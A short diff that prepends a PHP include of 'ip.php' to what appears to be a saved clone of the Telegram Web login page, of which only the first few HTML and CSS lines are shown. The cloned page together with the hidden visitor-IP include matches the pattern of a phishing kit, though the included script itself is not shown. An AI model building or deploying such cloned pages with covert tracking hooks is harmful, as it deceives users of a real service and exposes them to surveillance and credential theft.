@@ -1,3 +1,4 @@
+<?php include 'ip.php'; ?>
 ﻿<!DOCTYPE html><html manifest="webogram.appcache" ng-csp="" xmlns:ng="http://angularjs.org" id="ng-app" style="display: block; background: rgb(231, 235, 240) none repeat scroll 0% 0%;" lang="en"><head>
 <meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"><title>Telegram Web</title><style data-savepage-href="css/app.css">@charset "UTF-8";
 .ng-cloak,.ng-hide:not(.ng-hide-animate),.x-ng-cloak,[data-ng-cloak],[ng-cloak],[ng\:cloak],[x-ng-cloak]{display:none!important}
